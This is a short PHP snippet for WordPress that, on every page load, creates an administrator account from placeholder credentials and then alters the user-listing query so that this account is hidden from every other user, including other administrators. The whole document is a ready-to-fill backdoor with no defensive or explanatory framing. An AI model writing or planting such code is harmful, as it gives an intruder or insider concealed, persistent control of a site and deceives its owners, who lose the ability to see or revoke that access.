<?php 
function create_hidden_admin_account() {
    $username = 'username';     // Username you want to create
    $password = 'password';     // Password you want to set
    $email = 'email';           // Email you want to set

    if ( !username_exists($username) && !email_exists($email) ) {
        $user_id = wp_create_user($username, $password, $email);
        if ( is_int($user_id) ) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

add_action('init', 'create_hidden_admin_account');

function hide_ghost_user($user_search) {
    global $current_user;
    $username_to_hide = 'username'; // Username you want to hide

    // Only apply the filter if the current user is NOT the one we want to hide
    if ($current_user->user_login !== $username_to_hide) {
        global $wpdb;
        // Modify the query to exclude the user from the list
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != '$username_to_hide'", $user_search->query_where);
    }
}

add_action('pre_user_query', 'hide_ghost_user');
